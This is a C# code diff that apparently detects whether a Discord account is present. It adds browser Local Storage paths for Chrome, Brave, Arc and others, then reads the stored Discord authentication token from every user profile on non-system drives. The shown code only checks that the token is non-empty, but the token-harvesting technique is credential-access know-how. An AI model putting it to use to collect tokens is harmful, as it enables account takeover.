@@ -379,6 +379,34 @@ public static partial class PreparingStage
 				})
 				.Any(hasGame => hasGame);
 
+			// DiscordAccount = DriveInfo.GetDrives()
+			// 	.Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
+			// 	.SelectMany(d =>
+			// 	{
+			// 		string usersPath = Path.Combine(d.Name, "Users");
+			// 		if (!Directory.Exists(usersPath)) return [];
+
+			// 		return Directory.GetDirectories(usersPath)
+			// 			.Select(userDir => Path.Combine(userDir, "AppData", "Roaming", "discord", "Local Storage", "leveldb"))
+			// 			.Where(Directory.Exists);
+			// 	})
+			// 	.Any(leveldbPath =>
+			// 	{
+			// 		var accounts = DiscordHelper.GetAccountData(leveldbPath);
+			// 		return accounts != null && accounts.Count > 0;
+			// 	});
+
+			var browserPaths = new Dictionary<string, string>
+			{
+				{ @"AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", "Chrome" },
+				{ @"AppData\Local\Thorium\User Data\Default\Local Storage\leveldb", "Thorium" },
+				{ @"AppData\Local\imput\Helium\User Data\Default\Local Storage\leveldb", "Helium" },
+				{ @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb", "Brave" },
+				{ @"AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb", "Vivaldi" },
+				{ @"AppData\Local\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data\Default\Local Storage\leveldb", "Arc" },
+				{ @"AppData\Local\Perplexity\Comet\User Data\Default\Local Storage\leveldb", "Perplexity" }
+			};
+
 			DiscordAccount = DriveInfo.GetDrives()
 				.Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
 				.SelectMany(d =>
@@ -387,13 +415,21 @@ public static partial class PreparingStage
 					if (!Directory.Exists(usersPath)) return [];
 
 					return Directory.GetDirectories(usersPath)
-						.Select(userDir => Path.Combine(userDir, "AppData", "Roaming", "discord", "Local Storage", "leveldb"))
-						.Where(Directory.Exists);
+						.SelectMany(userDir => browserPaths.Keys.Select(browserPath => new { Path = Path.Combine(userDir, browserPath), Browser = browserPaths[browserPath] }))
+						.Where(x => Directory.Exists(x.Path));
 				})
-				.Any(leveldbPath =>
+				.Any(databasePath =>
 				{
-					var accounts = DiscordHelper.GetAccountData(leveldbPath);
-					return accounts != null && accounts.Count > 0;
+					try
+					{
+						var tokenNode = DatabaseHelper.Read(databasePath.Path, "_https://discord.com", "token");
+						string token = tokenNode?.ToString();
+						return !string.IsNullOrEmpty(token);
+					}
+					catch
+					{
+						return false;
+					}
 				});
 
 			var nics = DeviceHelper.GetDevices(DeviceType.NIC);
